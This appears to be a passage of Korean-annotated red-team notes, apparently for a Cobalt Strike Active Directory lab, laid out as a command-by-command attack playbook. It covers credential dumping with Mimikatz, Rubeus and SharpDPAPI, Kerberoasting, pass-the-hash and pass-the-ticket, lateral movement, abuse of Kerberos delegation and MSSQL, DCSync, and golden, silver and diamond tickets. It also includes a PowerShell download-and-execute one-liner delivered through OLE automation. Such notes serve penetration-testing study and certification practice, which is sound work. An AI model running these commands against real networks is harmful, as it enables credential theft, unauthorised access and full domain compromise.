- Master key Path : %APPDATA%\Microsoft\Protect\[User_SID]\
```
## Step 1. List vault (자격 증명 나열)
### 🔨 비콘 명령어 
beacon> ls C:\Users\pchilds\AppData\Roaming\Microsoft\Credentials
### 🔨 vaultcmd
beacon> run vaultcmd /list
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
beacon> run vaultcmd /listcreds:"Web Credentials" /all
### 🔨 SeatBelt
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles
### 🔨 Mimmikatz
beacon> mimikatz vault::list

## Step 2. Find master key (DPAPI 마스터 키 추출)
### 🔨 SharpDPAPI
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe masterkeys /rpc
### 🔨 Mimikatz (파일 복호화)
beacon> ls C:\Users\pchilds\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104
beacon> mimikatz dpapi::masterkey /in:C:\Users\pchilds\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc
### 🔨 Mimikatz (메모리 헌팅)
beacon> mimikatz !sekurlsa::dpapi

## Step 3. Decrypt credentials using DPAPI (자격증명 복호화)
### 🔨 SharpDPAPI
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
### 🔨 Mimikatz
beacon> mimikatz dpapi::cred /in:C:\Users\pchilds\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:[MASTER_KEY]
```
### LSASS Memory
```
beacon> mimikatz sekurlsa::logonpasswords
beacon> mimikatz sekurlsa::ekeys
```
### Security Account Manager
```
beacon> mimikatz !lsadump::sam
```
### LSA Secrets
```
beacon> mimikatz !lsadump::secrets
```
### Cached Domain Credentials 
```
beacon> mimikatz !lsadump::cache
```
### AS-REP Roasting
```
## Step 1. Find AS-REP Roastable User (AS-REP Roasting 가능한 사용자 확인)
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(UserAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,samaccountname,serviceprincipalname

## Step 2. AS-REP Roasting
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:[USERNAME] /format:hashcat /nowrap
```
### Kerberoasting
```
## Step 1. Find Kerberoastable User (Kerberoasting 가능한 사용자 확인)
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname

## Step 2. Kerberoasting
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:MSSQLSvc/lon-sql-1.contoso.com:1433 /format:hashcat /simple /nowrap
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:[USERNAME] /format:hashcat /simple /nowrap
```
### Extracting Tricket
```
## Step 1. Triage ticket
### 🔨 Rubeus
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
### 🔨 비콘 명령어
beacon> krb_triage

## Step 2. Dump ticket (TGT 메모리 덤프)
### 🔨 Rubeus
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:[0xluid] /service:krbtgt /nowrap
### 🔨 비콘 명령어
beacon> krb_dump /luid:[luid] /service:krbtgt
### 🔨 Mimikatz
beacon> mimikatz !sekurlsa::tickets
```
### Renewing TGT
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:[TGT]
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:[TGT]
```
### Cloud Config File
```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe CloudCredentialFiles
```
### Putty Session
```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe PuttySessions
```
### SSH/RDP Session
```
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe rdp
```

## User Impersonation
```
beacon> make_token CONTOSO\rsteel Passw0rd!

beacon> ps
beacon> steal_token [pid]

# token-store
beacon> token-store steal [pid]
beacon> token-store show
beacon> token-store use [id]
beacon> tokne-store remove [id]
beacon> tokne-store remove-all
```
### Make the Hash
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /username:rsteel /password:Passw0rd! /domain:CONTOSO.COM
```
### Pass the Hash
```
beacon> pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889
```
### Requesting TGT (Over Pass the Hash)
```
# Use AES256 Key
### 🔨 Rubeus
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /opsec /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
### 🔨 비콘 명령어
beacon> krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960

## Use NTLM Hash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /ntlm:59fc0f884922b4ce376051134c71e22c /opsec /nowrap
```
### Inject TGT (Pass the Ticket)
```
# kirbi 파일을 이용한 PtT
## Step 1. .kirbi 파일 생성
PS> $ticket = "[TGT]"
PS> [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))

## Step 2. Injet TGT (TGT 주입)
### 🔨 비콘 명령어
beacon> make_token CONTOSO\rsteel FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
### 🔨 Rubeus 
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /domain:CONTOSO.COM /username:rsteel /password:FakePass /ticket:[.kirbi_FILE]
beacon> steal_token [PID]

# Rubeus 도구를 통한 TGT 주입 1
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:[LUID] /ticket:[TGT]
beacon> steal_token [PID]

# Rubeus 도구를 통한 TGT 주입 2
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass /ticket:[TGT]
beacon> steal_token [PID]
```
### TGT 조회
```
beacon> run klist
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist /luid:0x9f7e05
```
### 토큰 및 티켓 제거
```
# 토큰 버리기
beacon> rev2self

# TGT 버리기
beacon> kerberos_ticket_purge
```
### Requesting TGS
```
### 🔨 Rubeus
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /dc:CONTOSO.COM /ticket:[TGT] /nowrap
### 🔨 비콘 명령어
beacon> krb_asktgs /service:ldap/lon-dc-1 /ticket:[TGT]
```

## Lateral Movement
### SCShell
- https://github.com/Mr-Un1k0d3r/SCShell/tree/master/CS-BOF
```
beacon> jump scshell64 lon-ws-1 smb
```
### Jump
```
beacon> jump [exploit] [target] [listener]
beacon> jump winrm64 lon-ws-1 smb
beacon> jump psexec64 lon-ws-1 smb
beacon> jump psexec_psh lon-ws-1 smb
```
### Execute Commmand
```
beacon> remote-exec [method] [target] [command]
beacon> remote-exec winrm lon-ws-1 net sessions

beacon> cd \\lon-ws-1\ADMIN$
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec wmi lon-ws-1 C:\Windows\smb_x64.exe

beacon> cd \\lon-ws-1\ADMIN$
beacon> upload C:\Payloads\smb_x64.exe
beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=lon-ws-1.contoso.com command="C:\Windows\smb_x64.exe"
```

## Pivoting
```
beacon> socks 1080 socks5
beacon> socks stop

# From Windows
## Proxifier 설정 - Proxy Server, Proxification Rule
PS> Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.1 lon-dc-1'
## 공격자 머신에서 C:\Tools\SysinternalsSuite\ADExplorer64.exe 실행 가능
PS> $Cred = Get-Credential CONTOSO.COM\rsteel
PS> Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Credential $Cred -Server lon-dc-1

PS> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /domain:CONTOSO.COM /username:rsteel /password:FakePass /ticket:[kirbi_FILE] /show
PS> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[kirbi_FILE] /dc:lon-dc-1 /ptt

PS> runas /netonly /user:CONTOSO\pchilds powershell
PS*> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt /nowrap

# From Linux
## /etc/proxychains.conf 파일에서 먼저 38번째 줄의 proxy_dns 부분을 주석처리 한 후, 64번째 줄의 socks4 127.0.0.1 9050 이 부분을 socks5 10.0.0.5 1080 으로 변경해야 한다.
attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Desktop$ ticketConverter.py rsteel.kirbi rsteel.ccache
attacker@DESKTOP-FGSTPS7:~$ export KRB5CCNAME=/mnt/c/Users/Attacker/Desktop/rsteel.ccache
attacker@DESKTOP-FGSTPS7:~$ proxychains smbexec.py -no-pass -k -dc-ip lon-dc-1 CONTOSO.COM/rsteel@lon-ws-1

attacker@DESKTOP-FGSTPS7:~$ proxychains getTGT.py 'CONTOSO.COM/rsteel:Passw0rd!' -dc-ip 10.10.120.1
attacker@DESKTOP-FGSTPS7:~$ export KRB5CCNAME=rsteel.ccache
attacker@DESKTOP-FGSTPS7:~$ proxychains mssqlclient.py contoso.com/rsteel@lon-db-1 -windows-auth -no-pass -k -dc-ip 10.10.120.1

# Reverse Port Forward
beacon> rportfwd [bind port] [forward host] [forward port]
beacon> rportfwd stop [bind port]
```

## Delegatoin
- S4U2self : Protocol Transition (사용자 사칭 가능)
- S4U2Proxy : 위임 (TGS 전환)
### Unconstrained Delegation
```
## Step 1. Find Unconstrained Delegation (제약없는 위임 설정된 컴퓨터 확인)
### 🔨 ldapsearch
beacon> ldapsearch (&(samAccountType=805306369)
(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
### 🔨 PowerView
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Get-DomainComputer -Unconstrained
### 🔨 ADSearch
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname

## Step 2. Monitor TGT
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap

## Step 3. 강제 인증 유도
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1

## Step 4. S4U2self Computer Takeover (lon-dc-1의 TGT를 얻은 경우, S4U2Self를 통해 cifs 등 필요한 TGS 요청)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:[TGT] /nowrap
```
### Constrained Delegation
```
# With protocol transition
## Step 1. Find Constrained Delegation (제약 위임 설정된 컴퓨터 확인)
### 🔨 ldapsearch
beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
### 🔨 ADSearch
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes samaccountname,msds-allowedtodelegateto

## Step 2. Check TRUSTED_TO_AUTH_FOR_DELEGATION (S4U2Self가 활성화 되어있는지 확인)
beacon> ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl
PS> [System.Convert]::ToBoolean(16781312 -band [UAC])

## Step 3.S4U2self -> S4U2Proxy (msDS-AllowedToDelegateTo에 등록된 서비스 티켓을 원하는 사용자로 발급)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /impersonateuser:Administrator /nowrap

## Step 3'. S4U2self -> S4U2Proxy -> Service Name Substitution (msDS-AllowedToDelegateTo에 등록된 서비스 티켓을 원하는 사용자로 발급 후 유의미한 서비스 티켓으로 전환)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs,http /ticket:[TGT] /impersonateuser:Administrator /nowrap

# Without protocol transition
## Step 1. Find Constrained Delegation (제약 위임 설정된 컴퓨터 확인)
### 🔨 ldapsearch
beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
### 🔨 ADSearch
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes samaccountname,msds-allowedtodelegateto

## Step 2. Check TRUSTED_TO_AUTH_FOR_DELEGATION (S4U2Self가 활성화 되어있는지 확인)
beacon> ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl
PS> [System.Convert]::ToBoolean(16781312 -band [UAC])

## Step 3. S4UProxy만 수행하여 msDS-AllowedToDelegateTo에 등록된 서비스 티켓 발급
### 전제조건 : 내가 사칭하고자 하는 사용자의 유효한 TGS를 가지고 있어야함.
### TGT - 위임 제약 컴퓨터의 TGT, TGS - 내가 사칭하고자 하는 사용자의 유효한 TGS
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /tgs:[TGS] /nowrap
```
### Resource-Based Constrained Delegation
```
# Case-1 : SPN 설정된 컴퓨터를 장악하고 있는 경우 혹은 SYSTEM 권한일 경우
### SYSTEM 권한일 경우, 본인이 SPN을 가진 '컴퓨터 계정' 임
## Step 1. Setting Proxy -> runas -> ldap TGS 발급
PS*> ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1

## Step 2. 쓰기 권한 있는 사용자 찾기
### 🔨 PowerView (through PS)
PS*> Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
### 🔨 PowerView (through beacon)
beacon> powerpick Get-DomainUser | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

## Step 3. Step 2에서 찾은 사용자 조회
PS*> Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-813047887-1107)' -Server 'lon-dc-1'

## Step 4. Step 2에서 찾은 사용자 TGT Dump

## Step 5. Find Resource-Based Constrained Delegation (RBCD 제약 위임 설정된 컴퓨터 확인)
### 🔨 PowerView
PS*> Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
### 🔨 ADSearch
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" --attributes samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity

## Step 6. PrincipalsAllowedToDelegateToAccount 속성에 내가 장악한 컴퓨터 추가
### 기존에 PrincipalsAllowedToDelegateToAccount 속성에 있던 컴퓨터도 같이 추가 필요
PS*> $ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 10.10.120.1 
PS*> C:\Users\Attacker> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 10.10.120.1

## Step 7. 내가 장악한 컴퓨터의 TGT 덤프
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:[0xluid] /service:krbtgt /nowrap

## Step 8. S4U Abuse
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /nowrap

## Step 9. PrincipalsAllowedToDelegateToAccount 속성 원복


# CASE-2 : SPN 설정된 컴퓨터도 없고, SYSTEM 권한도 아닐 경우
### 내가 쓰기 권한이 있어야 함 (SYSTEM 권한이 아니기에 쓰기권한 있는 사용자 TGT dump 불가)
## Step 1. Find Resource-Based Constrained Delegation (RBCD 제약 위임 설정된 컴퓨터 확인)
### 🔨 PowerView
PS*> Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
### 🔨 ADSearch
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" --attributes samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity

## Step 2. Check ms-DS-MachineAccountQuota (도메인에서 생성할 수 있는 컴퓨터 계정 수 확인)
beacon> powerpick Get-DomainObject -Identity "DC=contoso,DC=com" -Properties ms-DS-MachineAccountQuota

## Step 3. Create new Computer Account (새로운 컴퓨터 계정 추가)
beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make --Domain contoso.com

## Step 4. Dump TGT of My Computer (내 컴퓨터 TGT 덤프)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:contoso.com
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:[AES256] /nowrap

## Step 5. S4U Abuse
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:EvilComputer$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /nowrap
```

## Microsoft SQL Server
- SQL-BOF : C:\Tools\SQL-BOF\SQL.cna
### Enumeration
```
### 🔨 ldapsearch
beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
### 🔨 portscan
beacon> portscan 10.10.120.0/23 1433 arp 1024
### 🔨 PowerUpSQL
beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1 
beacon> powerpick Get-SQLInstanceDomain
beacon> powershell Get-SQLServerInfo -Instance "[Instance]"

beacon> sql-1434udp <DB_IP>
beacon> sql-info lon-db-1
beacon> sql-whoami lon-db-1
beacon> ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
```
### xp_cmdshell
```
## Step 1. Check xp_cmdshell (xp_cmdshell 설정 확인)
beacon> sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"

## Step 2. Enable xp_cmdshell (xp_cmdshell 활성화)
beacon> sql-enablexp lon-db-1

## Step 3. Execute Command (명령어 실행)
beacon> sql-xpcmd lon-db-1 "hostname && whoami"

## Step 4. Disable xp_cmdshell (xp_cmdshell 비활성화)
beacon> sql-disablexp lon-db-1
```
### OLE Automation
```
## Step 1. Check OLE Automation (OLE Automation 설정 확인)
beacon> sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'"

## Step 2. Enable OLE Automation (OLE Automation 활성화)
beacon> sql-enableole lon-db-1

##  Step 3. Cobalt Strike 웹 서버에 페이로드 호스팅
## Step 4. DB 서버에서 접근 못하는 경우를 고려하여 리버스 포트 포워딩
beacon> rportfwd 8080 10.0.0.5 80

## Step 5. 페이로드 다운로드할 수 있는 One-Liner 생성
PS> $cmd = 'iex (new-object net.webclient).downloadstring("http://lon-wkstn-1:8080/b")'
PS> [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))

### Step 6. Execute Command (명령어 실행)
beacon> sql-olecmd lon-db-1 "cmd /c powershell -w hidden -nop -enc [ONE-LINER]"

## Step 7. Disable OLE Automation (OLE Automation 비활성화)
beacon> sql-disableole lon-db-1
```
### SQL Common Language Runtime
```
## Step 1. Check SQL CLR (SQL CLR 설정 확인)
beacon> sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"

## Step 2. Enable SQL CLR (SQL CLR 활성화)
beacon> sql-enableclr lon-db-1

## Step 3. Create 악성 DLL

## Step 4. Execute Command (명령어 실행)
beacon> sql-clr lon-db-1 [악성DLL] MyProcedure

## Step 5. Disable SQL CLR (SQL CLR 비활성화)
beacon> sql-disableclr lon-db-1
```
### Linked Servers
```
## Step 1. Check SQL Links (SQL Link 확인)
beacon> sql-links lon-db-1

## Step 2. Query to Linked SQL Server (Linked Server를 통해 쿼리 가능)
beacon> sql-query lon-db-1 "SELECT @@SERVERNAME" "" lon-db-2

## Step 3. Check RPC Out (RPC Out 설정 확인)
beacon> sql-query lon-db-1 "SELECT @@SERVERNAME" "" lon-db-2

## Step 4. Enable RPC Out (RPC Out 활성화)
beacon> sql-enablerpc lon-db-1 lon-db-2

## Step 5. Command through Code Execution, OLE Autommation, SQL CLR
```

## Domain Dominance
### DCSync
- 도메인 관리자, 엔터프라이즈 관리자, 도메인 컨트롤러 컴퓨터 계정만 가능
- 일반 사용자 중에서도 DS-Replication-Get-Changes 권한 사용자도 가능
```
### 🔨 비컨 명령어
beacon> dcsync contoso.com CONTOSO\krbtgt
### 🔨 mimikatz
beacon> mimmikatz lsadump::dcsync /user:krbtgt /domain:contoso.com
```
### Silver Ticket
- 오프라인 제작
```
# Case-1 : 컴퓨터의 password hash를 탈취한 경우
## Step 1. 컴퓨터의 password hash 탈취
beacon> mimikatz !sekurlsa::ekeys
beacon> mimikatz !sekurlsa::logonpasswords

## Step 2. Silver Ticket 제작
PS> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/lon-db-1 /aes256:bc6fd6e8519b52e09f60961beeee083a441c25908e30a6c29b124b516e06945f /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap

# Case-2 : 컴퓨터의 평문 비밀번호를 알고 있는 경우
## Step 1. password hash 만들기
PS> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:mssql_svc /domain:CONTOSO.COM /password:Passw0rd!

## Step 2. Silver Ticket 제작
PS> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:MSSQLSvc/lon-db-1.contoso.com:1433 /rc4:FC525C9683E8FE067095BA2DDC971889 /user:rsteel /id:1108 /groups:513,1106,1107,4602 /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```
### Golden Ticket
- 오프라인 제작
- 서비스에 따른 lateral movement 방법
	- CIFS =>psexec
	- HOST & HTTP => winrm
	- LDAP => dcsync (only 도메인 관리자)
```
## Step 1. DCSync를 통해 krbtgt hash 추출
beacon> dcsync contoso.com CONTOSO\krbtgt

## Step 2. Golden Ticket 제작
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```
### Diamond Ticket
- 온라인 제작
```
## Step 1. DCSync를 통해 krbtgt hash 추출
beacon> dcsync contoso.com CONTOSO\krbtgt

## Step 2. Diamond Ticket 제작
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap
```
### DPAPI Backup Key
```
## Step 1. DPAPI Backup Key 추출
### 🔨 SharpDPAPI
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey
### 🔨 Mimikatz
beacon> mimikatz lsadump::backupkeys

## Step 2. 저장된 자격 증명 복호화
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:[DPAPI_BACKUP_KEY]
```

## Forest & Domain Trusts
beacon> ldapsearch (samAccountType=805306370) --attributes samAccountName
### Parent-Child Trust
- inter-realm ticket 오프라인 제작 시, SID History 조작
```
## Step 1. 신뢰 관계 확인
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName

## Step 2. 부모 도메인 SID 가져오기
beacon> ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com

## Step 3. 내 도메인 (=자식 도메인) SID 가져오기
beacon> ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid

## Step 4. 자식 도메인의 Domain Admins 사용자 검색
beacon> ldapsearch "(&(samAccountType=268435456)(samAccountName=Domain Admins))" --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes member

## Step 5. Domain Admin 사용자 사칭

## Step 6. DCSync를 통해 자식 도메인의 krbtgt hash 추출
beacon> dcsync dublin.contoso.com DUBLIN\krbtgt

## Step 7. inter-realm ticket 제작
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /nowrap
```
### Inbound Trust
```
# Case-1 : inter-realm key를 탈취할 수 있는 경우
## Step 1. 신뢰 관계 확인
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName

## Step 2. FSP 객체 확인
beacon> ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com

## Step 3. FSP의 SID를 통해 사용자 확인
beacon> ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102)

## Step 4. 신뢰하는 도메인의 DC 찾기
beacon> nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV

## Step 5. Step 3에서 확인한 사용자가 어떤 권한을 가지고 있는지 확인 (GPO 분석 등)

## Step 6. 신뢰하는 도메인에 어떤 컴퓨터가 있는지 확인
beacon> ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=partner,DC=com --hostname partner.com 

## Step 7. inter-realm key 탈취 (Trust Account의 password hash 탈취)
beacon> ldapsearch (samAccountType=805306370) --attributes samAccountName
beacon> dcsync contoso.com CONTOSO\PARTNER$

## Step 8. Step 3에서 확인한 FSP 사용자의 Silver ticket 제작 (inter-realm ticket). 이 때 groups에는 Step 2에서 확인한 그룹이 포함되어야 함
PS> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap

## Step 9. inter-realm TGT를 통해 Step 5에서 확인한 컴퓨터에 대한 TGS 발급
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:[inter-realm TGT] /nowrap

# Case-2 : FSP 사용자의 AES256 hash key를 탈취할 수 있는 경우
### Step 1~6는 위와 동일
## Step 7. DCSync를 통해 FSP 사용자의 AES256 key 탈취
beacon> dcsync contoso.com CONTOSO\rsteel

## Step 8. FSP 사용자의 TGT 요청
beacon> krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960

## Step 9. inter-realm ticket 요청
